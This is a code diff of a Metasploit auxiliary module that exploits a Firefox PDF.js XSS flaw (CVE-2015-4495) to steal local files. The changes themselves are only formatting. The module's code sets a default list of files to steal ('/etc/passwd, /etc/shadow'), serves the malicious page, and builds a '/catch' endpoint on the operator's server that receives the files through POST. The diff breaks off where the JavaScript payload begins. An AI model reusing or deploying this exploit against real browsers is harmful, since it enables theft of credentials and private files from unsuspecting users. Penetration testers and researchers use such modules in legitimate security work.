@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,54 +7,52 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Firefox PDF.js Browser File Theft',
-      'Description' => %q{
-        This module abuses an XSS vulnerability in versions prior to Firefox 39.0.3, Firefox ESR
-        38.1.1, and Firefox OS 2.2 that allows arbitrary files to be stolen. The vulnerability
-        occurs in the PDF.js component, which uses Javascript to render a PDF inside a frame with
-        privileges to read local files. The in-the-wild malicious payloads searched for sensitive
-        files on Windows, Linux, and OSX. Android versions are reported to be unaffected, as they
-        do not use the Mozilla PDF viewer.
-      },
-      'Author'         => [
-        'Unknown', # From an 0day served on Russian news website
-        'fukusa',  # Hacker news member that reported the issue
-        'Unknown'  # Metasploit module
-      ],
-      'License'     => MSF_LICENSE,
-      'Actions'     => [[ 'WebServer' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'References' =>
-        [
-          ['URL', 'https://paste.debian.net/290146'], # 0day exploit
-          ['URL', 'https://news.ycombinator.com/item?id=10021376'], # discussion with discoverer
-          ['URL', 'https://blog.mozilla.org/security/2015/08/06/firefox-exploit-found-in-the-wild/'],
-          ['CVE', '2015-4495']
-        ],
-      'DefaultAction'  => 'WebServer'
-    ))
+                      'Name'        => 'Firefox PDF.js Browser File Theft',
+                      'Description' => %q(
+                        This module abuses an XSS vulnerability in versions prior to Firefox 39.0.3, Firefox ESR
+                        38.1.1, and Firefox OS 2.2 that allows arbitrary files to be stolen. The vulnerability
+                        occurs in the PDF.js component, which uses Javascript to render a PDF inside a frame with
+                        privileges to read local files. The in-the-wild malicious payloads searched for sensitive
+                        files on Windows, Linux, and OSX. Android versions are reported to be unaffected, as they
+                        do not use the Mozilla PDF viewer.
+                      ),
+                      'Author' => [
+                        'Unknown', # From an 0day served on Russian news website
+                        'fukusa',  # Hacker news member that reported the issue
+                        'Unknown'  # Metasploit module
+                      ],
+                      'License'     => MSF_LICENSE,
+                      'Actions'     => [[ 'WebServer' ]],
+                      'PassiveActions' => [ 'WebServer' ],
+                      'References' =>
+                        [
+                          ['URL', 'https://paste.debian.net/290146'], # 0day exploit
+                          ['URL', 'https://news.ycombinator.com/item?id=10021376'], # discussion with discoverer
+                          ['URL', 'https://blog.mozilla.org/security/2015/08/06/firefox-exploit-found-in-the-wild/'],
+                          ['CVE', '2015-4495']
+                        ],
+                      'DefaultAction' => 'WebServer'))
 
     register_options([
-      OptString.new('FILES', [
-        false,
-        'Comma-separated list of files to steal',
-        '/etc/passwd, /etc/shadow'
-      ])
-    ], self.class)
+                       OptString.new('FILES', [
+                                       false,
+                                       'Comma-separated list of files to steal',
+                                       '/etc/passwd, /etc/shadow'
+                                     ])
+                     ], self.class)
 
     register_advanced_options([
-      OptInt.new('PER_FILE_SLEEP', [
-        false,
-        'Milliseconds to wait before attempting to read the frame containing each file',
-        250
-      ])
-    ], self.class)
+                                OptInt.new('PER_FILE_SLEEP', [
+                                             false,
+                                             'Milliseconds to wait before attempting to read the frame containing each file',
+                                             250
+                                           ])
+                              ], self.class)
   end
 
   def run
@@ -62,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_request_uri(cli, request)
-    if request.method.downcase == 'post'
+    if request.method.casecmp('post').zero?
       print_status('Got POST request...')
       process_post(cli, request)
       send_response_html(cli, '')
@@ -89,16 +88,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def backend_url
     proto = (datastore['SSL'] ? 'https' : 'http')
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
-    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
-    resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
+    my_host = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']
+    port_str = datastore['SRVPORT'].to_i == 80 ? '' : ":#{datastore['SRVPORT']}"
+    resource = '/' == get_resource[-1, 1] ? get_resource[0, get_resource.length - 1] : get_resource
 
     "#{proto}://#{my_host}#{port_str}#{resource}/catch"
   end
 
-
   def file_payload
-    %Q|
+    %|
       var files = (#{JSON.generate(file_urls)});
       function next() {
         var f = files.pop();
